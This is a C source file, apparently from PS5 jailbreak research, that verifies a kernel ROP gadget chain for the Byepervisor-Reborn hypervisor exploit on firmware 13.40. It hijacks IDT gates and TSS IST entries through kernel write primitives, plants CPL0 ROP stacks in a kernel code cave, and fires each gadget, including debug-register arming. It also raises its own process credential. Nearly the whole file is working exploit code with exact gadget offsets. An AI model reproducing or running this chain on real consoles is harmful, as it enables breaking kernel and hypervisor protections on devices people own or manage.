/* oracle9 — verify upstream Byepervisor-Reborn 13_40.h gadget chain (2026-10-22).
 * Upstream commit 768e8a1 added full 13.40 support; their table matches our
 * TF-oracle-verified values 6/6 (PIVOT/IRETQ/PMAP_STORE/DATA_CAVE/HV_MP/
 * IDT+TSS). Every gadget their payload executes on this console is fired
 * here, safest first, all regs shielded, log fsync'd before each fire.
 *
 * Verdicts via the proven oracle machinery: int179 CPL3 gate -> add_rsp,0xE8
 * iretq -> CPL0 gadget with planted scratch stack -> ret -> IRETQ -> CPL0
 * iretq frame -> CPL3 landing, or resumectx tail for the DR tests.
 *
 *  1 MOV_RAX_RSI  0x8DC014  mov rax,rsi;ret        identity
 *  2 MOV_RAX_RDI  0xBE058A  mov rax,rdi;ret        identity
 *  3 POP_RAX      0x291291  pop rax;ret
 *  4 POP_RCX      0x2918A2  pop rcx;ret
 *  5 POP_RDX      0x2A0D9B  pop rdx;ret
 *  6 POP_R8       0xB825CD  pop r8;ret
 *  7 POP_RSI      0xA37059  pop rsi;ret
 *  8 POP_RDI      0x676252  pop rdi;ret
 *  9 POP_RSP      0x291C32  pop rsp;ret            stack switch
 * 10 STORE_RCX_R8 0x472BE9  mov [rcx],r8;ret
 * 11 ST_RCX_RAX   0x2BB0AF  mov [rcx],rax;xor eax,eax;ret
 * 12 ST_RCX_RDX   0x824DF5  mov [rcx],rdx;ret
 * 13 STORE_RDI8   0x325DEF  mov [rdi+8],rcx;ret
 * 14 RET_TRAMP    0x291292  ret
 * 15 CLD+REP      0x362F60+0x25D027  cld;ret;rep movsb;nop;rep ret
 * 16 SET_DR7      0x9FFB56  mov dr7,rax; mov eax,r8d; ret   (rax=0, inert)
 * 17 RESUME0      0x2529D8  resumectx tail, ctx dr7=0 (inert), inert dr0
 * 18 ARM          0x2529D8  ctx dr7=0x403, dr0=cave+0x100 (inert target)
 * 19 DISARM       0x2529D8  ctx dr7=0, dr0=0
 * Log: /data/oracle9_1340.log
 */
#include <fcntl.h>
#include <inttypes.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <ps5/kernel.h>

#define CAVE_RVA 0x2D29000ULL
#define GS_OFF 0x20000ULL
#define IST4_TOP (CAVE_RVA + GS_OFF + 0x1F0ULL)
#define IST6_TOP (CAVE_RVA + GS_OFF + 0x440ULL)
#define SCRATCH (CAVE_RVA + 0x800ULL)
#define NATIVE1_RVA 0x268dc0ULL
#define NATIVE179_RVA 0x268ef0ULL
#define ADD_RSP_RVA 0x257B36ULL
#define IRETQ_RVA 0x257B3DULL

/* scratch stack layout (cave+0x800): [0]=popped value [1]=IRETQ [2..6]=iret frame */
#define T_STORE 0x600ULL
#define T_REP_DST 0x710ULL
#define T_REP_SRC 0x720ULL
#define CTX_OFF 0xB00ULL /* resumectx ctx */
#define CTX_RSP_OFF 0xB80ULL /* return chain after resumectx */

#define MAGIC 0x5152535455565758ULL

/* upstream 13_40.h gadget RVAs under test */
#define RVA_MOV_RAX_RSI 0x8DC014ULL
#define RVA_MOV_RAX_RDI 0xBE058AULL
#define RVA_POP_RAX 0x291291ULL
#define RVA_POP_RCX 0x2918A2ULL
#define RVA_POP_RDX 0x2A0D9BULL
#define RVA_POP_R8 0xB825CDULL
#define RVA_POP_RSI 0xA37059ULL
#define RVA_POP_RDI 0x676252ULL
#define RVA_POP_RSP 0x291C32ULL
#define RVA_ST_RCX_R8 0x472BE9ULL
#define RVA_ST_RCX_RAX 0x2BB0AFULL
#define RVA_ST_RCX_RDX 0x824DF5ULL
#define RVA_ST_RDI8_RCX 0x325DEFULL
#define RVA_RET_TRAMP 0x291292ULL
#define RVA_CLD 0x362F60ULL
#define RVA_REP_MOVSB 0x25D027ULL
#define RVA_SET_DR7 0x9FFB56ULL
#define RVA_DBREG_RESUME 0x2529D8ULL

#define KH_RC_RBP 0x20
#define KH_RC_RSP 0x28
#define KH_RC_RIP 0x38
#define KH_RC_DR7 0xA0

enum kind {
  K_MOVRSI, K_MOVRDI,          /* mov rax,X;ret -> landing rax==MAGIC */
  K_POP_RAX, K_POP_RCX, K_POP_RDX, K_POP_R8, K_POP_RSI, K_POP_RDI,
  K_POP_RSP,                   /* pop rsp;ret -> switch to alt stack */
  K_ST_R8, K_ST_RAX, K_ST_RDX, /* mov [rcx],rX -> mem==MAGIC */
  K_ST_RDI8,                   /* mov [rdi+8],rcx -> mem==MAGIC */
  K_RET,                       /* ret -> [0x808]=IRETQ */
  K_CLDREP,                    /* cld;ret pops REP; rep movsb; ret IRETQ */
  K_SETDR7,                    /* survival (rax=0) */
  K_RESUME,                    /* resumectx tail w/ ctx */
};

typedef struct {
  const char *name;
  uint64_t rva;
  enum kind kind;
  int no_tf; /* multi-instruction path: run to completion, no TF catch */
} cand_t;

static const cand_t cands[] = {
  {"MOV_RAX_RSI", RVA_MOV_RAX_RSI, K_MOVRSI},
  {"MOV_RAX_RDI", RVA_MOV_RAX_RDI, K_MOVRDI},
  {"POP_RAX", RVA_POP_RAX, K_POP_RAX},
  {"POP_RCX", RVA_POP_RCX, K_POP_RCX},
  {"POP_RDX", RVA_POP_RDX, K_POP_RDX},
  {"POP_R8", RVA_POP_R8, K_POP_R8},
  {"POP_RSI", RVA_POP_RSI, K_POP_RSI},
  {"POP_RDI", RVA_POP_RDI, K_POP_RDI},
  {"POP_RSP", RVA_POP_RSP, K_POP_RSP},
  {"ST_RCX_R8", RVA_ST_RCX_R8, K_ST_R8},
  {"ST_RCX_RAX", RVA_ST_RCX_RAX, K_ST_RAX},
  {"ST_RCX_RDX", RVA_ST_RCX_RDX, K_ST_RDX},
  {"ST_RDI8_RCX", RVA_ST_RDI8_RCX, K_ST_RDI8},
  {"RET_TRAMP", RVA_RET_TRAMP, K_RET},
  {"CLD+REP", RVA_CLD, K_CLDREP, 1},
  {"SET_DR7", RVA_SET_DR7, K_SETDR7},
  {"RESUME0_TF", RVA_DBREG_RESUME, K_RESUME, 0},   /* entry-sanity only */
  {"RESUME0", RVA_DBREG_RESUME, K_RESUME, 1},
  {"ARM0403", RVA_DBREG_RESUME, K_RESUME, 1},
  {"DISARM", RVA_DBREG_RESUME, K_RESUME, 1},
};
#define NCAND (sizeof cands / sizeof cands[0])

static uint64_t g_rows[16];
static uint64_t g_save4[16], g_save6[16];
static uint8_t g_gate1[16], g_gate179[16];
volatile int g_marker;
uint64_t g_text, g_data, g_ustack, g_phase2, g_shield, g_idx;
uint64_t g_rax, g_rcx, g_rdx, g_rsi, g_rdi, g_r8;
uint64_t g_rbx, g_r11, g_r12, g_r13, g_r14, g_r15;
uint64_t g_land_rsi, g_land_rdi, g_land_rcx, g_land_rdx, g_land_r8;
uint64_t g_land_r15, g_land_r14, g_land_r13, g_land_r12, g_land_r11, g_land_rax;
uint64_t g_ctx_dr7, g_ctx_dr0;
static jmp_buf g_jmp;
static int g_running;

__attribute__((naked)) static void
fire(void) {
  __asm__ volatile(
      "movl $5, g_marker(%rip)\n"
      "mov g_shield(%rip), %r9\n mov %r9, %r10\n mov %r9, %r12\n mov %r9, %rbp\n"
      "mov g_rbx(%rip), %rbx\n"
      "mov g_r11(%rip), %r11\n"
      "mov g_r13(%rip), %r13\n"
      "mov g_r14(%rip), %r14\n"
      "mov g_r15(%rip), %r15\n"
      "mov g_rax(%rip), %rax\n"
      "mov g_rcx(%rip), %rcx\n"
      "mov g_rdx(%rip), %rdx\n"
      "mov g_rsi(%rip), %rsi\n"
      "mov g_rdi(%rip), %rdi\n"
      "mov g_r8(%rip), %r8\n"
      "movl $6, g_marker(%rip)\n"
      "int $0xB3\n"
      "ud2\n");
}

__attribute__((naked)) static void
landing(void) {
  __asm__ volatile("mov %rsi, g_land_rsi(%rip)\n"
                   "mov %rdi, g_land_rdi(%rip)\n"
                   "mov %rcx, g_land_rcx(%rip)\n"
                   "mov %rdx, g_land_rdx(%rip)\n"
                   "mov %r8, g_land_r8(%rip)\n"
                   "mov %r15, g_land_r15(%rip)\n"
                   "mov %r14, g_land_r14(%rip)\n"
                   "mov %r13, g_land_r13(%rip)\n"
                   "mov %r12, g_land_r12(%rip)\n"
                   "mov %r11, g_land_r11(%rip)\n"
                   "mov %rax, g_land_rax(%rip)\n"
                   "mov g_phase2(%rip), %rax\n"
                   "call *%rax\n"
                   "ud2\n");
}

static void
record(const char *name, uint64_t rva, const char *verdict, int64_t len, uint64_t rsp) {
  printf("%-14s rva=%#06llx %s len=%lld rsp=%#llx rax=%#llx rcx=%#llx rdx=%#llx\n", name,
         (unsigned long long)rva, verdict, (long long)len,
         (unsigned long long)rsp, (unsigned long long)g_land_rax,
         (unsigned long long)g_land_rcx, (unsigned long long)g_land_rdx);
  fsync(STDOUT_FILENO);
}

static void
phase_db(void) {
  const cand_t *c = &cands[g_idx];
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  uint64_t f[5];
  uint64_t mem = 0;
  int ok = 0;
  const char *v = "FAIL";
  int64_t len;
  uint64_t popped = g_text + IRETQ_RVA; /* value at scratch[0] */

  memset(f, 0, sizeof f);
  kernel_copyout((intptr_t)(gs + 0x1c8ULL), f, sizeof f);
  len = (int64_t)f[0] - (int64_t)(g_text + c->rva);
  kernel_copyout((intptr_t)(gs + T_STORE), &mem, 8);

  if(c->no_tf)
    memset(f, 0, sizeof f); /* no TF frame; verdict is survival + effects */

  switch(c->kind) {
  case K_MOVRSI: ok = (len == 3 && g_land_rax == MAGIC); break;
  case K_MOVRDI: ok = (len == 3 && g_land_rax == MAGIC); break;
  case K_POP_RAX: ok = (len == 1 && g_land_rax == popped); break;
  case K_POP_RCX: ok = (len == 1 && g_land_rcx == popped); break;
  case K_POP_RDX: ok = (len == 1 && g_land_rdx == popped); break;
  case K_POP_R8:  ok = (len == 1 && g_land_r8 == popped); break;
  case K_POP_RSI: ok = (len == 1 && g_land_rsi == popped); break;
  case K_POP_RDI: ok = (len == 1 && g_land_rdi == popped); break;
  case K_POP_RSP: ok = (f[3] == g_text + IRETQ_RVA); break; /* rsp = popped [0x800] */
  case K_ST_R8:   ok = (mem == MAGIC); break;
  case K_ST_RAX:  ok = (mem == MAGIC); break; /* xor eax,eax is instr 2, TF stops first */
  case K_ST_RDX:  ok = (mem == MAGIC); break;
  case K_ST_RDI8: ok = (mem == MAGIC); break;
  case K_RET:     ok = (f[0] == g_text + IRETQ_RVA &&
                         f[3] == g_text + SCRATCH + 8); break;
  case K_CLDREP:  ok = ((mem & 0xff) == 0x41); break;
  case K_SETDR7:  ok = 1; break;
  case K_RESUME:  ok = 1; break;
  }
  if(ok)
    v = "PASS";
  printf("%-14s frame rip=%#llx rfl=%#llx rsp=%#llx mem=%#llx\n", c->name,
         (unsigned long long)f[0], (unsigned long long)f[2],
         (unsigned long long)f[3], (unsigned long long)mem);
  record(c->name, c->rva, v, len, f[3]);
  if(g_idx + 1 >= NCAND)
    g_running = 0;
  longjmp(g_jmp, 1);
}

static void
crash_handler(int sig, siginfo_t *si, void *uc) {
  (void)uc;
  char buf[128];
  const cand_t *c = g_idx < NCAND ? &cands[g_idx] : NULL;
  int n = snprintf(buf, sizeof buf, "SIGNAL %d marker %d addr=%#llx cand %s\n",
                   sig, g_marker, (unsigned long long)si->si_addr,
                   c ? c->name : "?");
  write(STDOUT_FILENO, buf, n);
  fsync(STDOUT_FILENO);
  _exit(99);
}

static int
readn(uint64_t a, void *b, size_t n) {
  return kernel_copyout((intptr_t)a, b, n);
}
static int
writen(uint64_t a, const void *b, size_t n) {
  return kernel_copyin(b, (intptr_t)a, n);
}
static void
mkgate(uint8_t *g, uint64_t target, uint8_t ist, uint8_t type) {
  uint16_t lo = (uint16_t)target, mid = (uint16_t)(target >> 16);
  uint32_t hi = (uint32_t)(target >> 32);
  memset(g, 0, 16);
  memcpy(g, &lo, 2);
  g[2] = 0x20;
  g[4] = ist;
  g[5] = type;
  memcpy(g + 6, &mid, 2);
  memcpy(g + 8, &hi, 4);
}
static uint64_t
gate_off(const uint8_t *g) {
  uint16_t lo = 0, mid = 0;
  uint32_t hi = 0;
  memcpy(&lo, g, 2);
  memcpy(&mid, g + 6, 2);
  memcpy(&hi, g + 8, 4);
  return ((uint64_t)hi << 32) | ((uint64_t)mid << 16) | lo;
}

int
main(void) {
  uint64_t data = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
  g_text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  uint64_t tss = data + 0x2ee6fe0ULL;
  uint64_t idt = data + 0x2ee4300ULL;
  uint64_t gs = g_text + CAVE_RVA + GS_OFF;
  uint8_t g1[16], g179[16];
  int fd = open("/data/oracle9_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if(fd > STDERR_FILENO)
      close(fd);
  }
  setvbuf(stdout, NULL, _IONBF, 0);
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGILL, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
  }

  printf("oracle9 upstream 13_40 chain verify; fw=%#x n=%zu\n",
         kernel_get_fw_version(), NCAND);
  fsync(STDOUT_FILENO);
  if((kernel_get_fw_version() & 0xffff0000U) != 0x13400000U)
    return 1;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);

  if(readn(idt + 16, g1, 16) || readn(idt + 179 * 16, g179, 16) ||
     gate_off(g1) != g_text + NATIVE1_RVA || g1[5] != 0x8e ||
     gate_off(g179) != g_text + NATIVE179_RVA || g179[4] != 0 ||
     g179[5] != 0x8e) {
    printf("ABORT gates not native\n");
    return 3;
  }
  memcpy(g_gate1, g1, 16);
  memcpy(g_gate179, g179, 16);

  {
    uint8_t *shield = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(shield == MAP_FAILED) {
      printf("shield mmap fail\n");
      return 4;
    }
    memset(shield, 0, 0x100000);
    g_shield = (uint64_t)(uintptr_t)shield + 0x80000;
  }

  {
    uint64_t zeros[16];
    if(readn(gs + 0x800, zeros, sizeof zeros)) {
      printf("cave read fail\n");
      return 4;
    }
    for(size_t i = 0; i < 16; i++)
      if(zeros[i]) {
        printf("ABORT cave not zero\n");
        return 4;
      }
  }

  uint8_t *ust = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if(ust == MAP_FAILED) {
    printf("ustack mmap fail\n");
    return 5;
  }
  memset(ust, 0, 0x2000);
  g_ustack = (uint64_t)(uintptr_t)ust + 0x1800;
  g_phase2 = (uint64_t)(uintptr_t)&phase_db;

  for(int cpu = 0; cpu < 16; cpu++) {
    g_rows[cpu] = tss + (uint64_t)cpu * 0x68ULL;
    if(readn(g_rows[cpu] + 0x3c, &g_save4[cpu], 8) ||
       readn(g_rows[cpu] + 0x4c, &g_save6[cpu], 8)) {
      printf("tss read fail cpu=%d\n", cpu);
      return 6;
    }
    if(writen(g_rows[cpu] + 0x3c, &(uint64_t){g_text + IST4_TOP}, 8) ||
       writen(g_rows[cpu] + 0x4c, &(uint64_t){g_text + IST6_TOP}, 8)) {
      printf("tss arm fail cpu=%d\n", cpu);
      return 6;
    }
  }

  /* CPL0 scratch stack at cave+0x800:
   *   [+0x00] popped value (IRETQ VA)   [+0x08] IRETQ VA (ret target)
   *   [+0x10..0x30] CPL3 iret frame {landing, 0x43, 0x202, ustack, 0x3b}
   * alt stack for POP_RSP at gs+0xA00: [0]=IRETQ [8..]=same frame
   * resumectx ctx at gs+CTX_OFF, return chain at gs+CTX_RSP_OFF
   */
  {
    uint64_t scratch[7];
    uint64_t frame[5] = {(uint64_t)(uintptr_t)&landing, 0x43, 0x202,
                         g_ustack, 0x3b};
    scratch[0] = g_text + IRETQ_RVA; /* value a pop gadget loads */
    scratch[1] = g_text + IRETQ_RVA; /* ret target for K_RET/pops */
    memcpy(&scratch[2], frame, sizeof frame);

    uint64_t catchf[5];
    memcpy(catchf, frame, sizeof catchf);
    uint64_t rep_src = 0x4142434445464748ULL;

    /* full-run resume chain: [0]=IRETQ popped by RET_TRAMP ret,
     * [1..5]=CPL3 iret frame (no TF: landing reached via IRETQ) */
    uint64_t ctx_rsp_chain[6] = {g_text + IRETQ_RVA,
                                 (uint64_t)(uintptr_t)&landing, 0x43, 0x202,
                                 g_ustack, 0x3b};

    if(writen(gs + 0x2b0, catchf, sizeof catchf) ||
       writen(gs + 0x1a0, catchf, sizeof catchf) ||
       writen(g_text + SCRATCH, scratch, sizeof scratch) ||
       writen(gs + T_REP_SRC, &rep_src, 8) ||
       writen(gs + CTX_RSP_OFF, ctx_rsp_chain, sizeof ctx_rsp_chain)) {
      printf("plant fail\n");
      return 7;
    }
  }

  mkgate(g1, g_text + ADD_RSP_RVA, 4, 0x8e);
  mkgate(g179, g_text + ADD_RSP_RVA, 6, 0xee);
  if(writen(idt + 16, g1, 16) || writen(idt + 179 * 16, g179, 16)) {
    printf("gate arm fail\n");
    return 8;
  }
  printf("gates armed; batch begin\n");
  fsync(STDOUT_FILENO);

  g_running = 1;
  for(g_idx = 0; g_idx < NCAND && g_running; g_idx++) {
    const cand_t *c = &cands[g_idx];
    uint64_t candf[5];
    uint64_t z = 0;

    candf[0] = g_text + c->rva;
    candf[1] = 0x20;
    candf[2] = c->no_tf ? 0x2 : 0x102;
    candf[3] = g_text + SCRATCH;
    candf[4] = 0x28;

    g_rax = g_shield;
    g_rcx = g_shield;
    g_rdx = g_shield;
    g_rsi = g_shield;
    g_rdi = g_shield;
    g_r8 = g_shield;
    g_rbx = g_r11 = g_r12 = g_r13 = g_r14 = g_r15 = 0;

    if(c->kind == K_MOVRSI)
      g_rsi = MAGIC;
    else if(c->kind == K_MOVRDI)
      g_rdi = MAGIC;
    else if(c->kind == K_ST_R8) {
      writen(gs + T_STORE, &z, 8);
      g_rcx = gs + T_STORE;
      g_r8 = MAGIC;
    } else if(c->kind == K_ST_RAX) {
      writen(gs + T_STORE, &z, 8);
      g_rcx = gs + T_STORE;
      g_rax = MAGIC;
    } else if(c->kind == K_ST_RDX) {
      writen(gs + T_STORE, &z, 8);
      g_rcx = gs + T_STORE;
      g_rdx = MAGIC;
    } else if(c->kind == K_ST_RDI8) {
      writen(gs + T_STORE, &z, 8);
      g_rdi = gs + T_STORE - 8;
      g_rcx = MAGIC;
    } else if(c->kind == K_CLDREP) {
      uint64_t sc[7];
      readn(g_text + SCRATCH, sc, sizeof sc);
      sc[0] = g_text + RVA_REP_MOVSB; /* cld's ret jumps into rep movsb */
      writen(g_text + SCRATCH, sc, sizeof sc);
      g_rcx = 1;
      g_rdi = gs + T_REP_DST;
      g_rsi = gs + T_REP_SRC;
      /* restore after fire */
    } else if(c->kind == K_SETDR7) {
      g_rax = 0;
    } else if(c->kind == K_RESUME) {
      /* resumectx tail: rax->dr0, [rdi+0xA0]->dr7, rsp/rbp/rip from ctx */
      uint64_t ctx[0x150 / 8];
      memset(ctx, 0, sizeof ctx);
      ctx[KH_RC_RBP / 8] = g_shield;
      ctx[KH_RC_RSP / 8] = gs + CTX_RSP_OFF; /* ret pops IRETQ chain there */
      ctx[KH_RC_RIP / 8] = g_text + RVA_RET_TRAMP;
      if(strcmp(c->name, "ARM0403") == 0) {
        ctx[KH_RC_DR7 / 8] = 0x403;
        g_rax = g_text + CAVE_RVA + 0x100ULL; /* dr0: inert cave addr */
      } else if(strcmp(c->name, "RESUME0") == 0) {
        ctx[KH_RC_DR7 / 8] = 0;
        g_rax = g_text + CAVE_RVA + 0x100ULL;
      } else { /* DISARM */
        ctx[KH_RC_DR7 / 8] = 0;
        g_rax = 0;
      }
      if(writen(gs + CTX_OFF, ctx, sizeof ctx)) {
        printf("ctx plant fail %s\n", c->name);
        break;
      }
      g_rdi = gs + CTX_OFF;
    }

    if(writen(gs + 0x500, candf, sizeof candf)) {
      printf("candf plant fail %s\n", c->name);
      break;
    }
    printf("-- firing %-14s\n", c->name);
    fsync(STDOUT_FILENO);

    g_marker = 0;
    g_land_rsi = g_land_rdi = g_land_rcx = g_land_rdx = g_land_r8 = 0;
    g_land_r15 = g_land_r14 = g_land_r13 = g_land_r12 = g_land_r11 = g_land_rax = 0;
    if(setjmp(g_jmp) == 0)
      fire();

    if(c->kind == K_CLDREP) {
      /* restore scratch[0] */
      uint64_t sc[7];
      readn(g_text + SCRATCH, sc, sizeof sc);
      sc[0] = g_text + IRETQ_RVA;
      writen(g_text + SCRATCH, sc, sizeof sc);
    }
  }

  if(kernel_copyin(g_gate1, (intptr_t)(idt + 16), 16) ||
     kernel_copyin(g_gate179, (intptr_t)(idt + 179 * 16), 16))
    printf("disarm fail\n");
  for(int cpu = 0; cpu < 16; cpu++) {
    kernel_copyin(&g_save4[cpu], (intptr_t)(g_rows[cpu] + 0x3c), 8);
    kernel_copyin(&g_save6[cpu], (intptr_t)(g_rows[cpu] + 0x4c), 8);
  }
  printf("BATCH_DONE disarmed\n");
  fsync(STDOUT_FILENO);
  return 0;
}
